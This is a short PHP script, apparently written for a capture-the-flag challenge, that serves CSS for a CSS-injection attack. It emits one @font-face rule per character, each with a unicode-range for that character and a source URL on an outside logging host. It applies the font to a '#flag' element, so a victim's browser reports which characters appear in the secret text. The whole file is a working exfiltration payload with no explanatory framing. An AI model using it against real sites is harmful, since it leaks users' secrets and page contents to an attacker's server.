<?php
# http://misc.peng.kr/css.php

header("Content-Type: text/css");

$table = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ \t{}_!?#-";
for($i = 0; $i < strlen($table); ++$i){
	echo "@font-face {
		font-family: 'fuckfont';
		src: url('http://misc.peng.kr/log.php?".urlencode($table[$i])."');
		unicode-range: U+".bin2hex($table[$i]).";
	}";
}

?>
#flag { 
	font-family: fuckfont;
}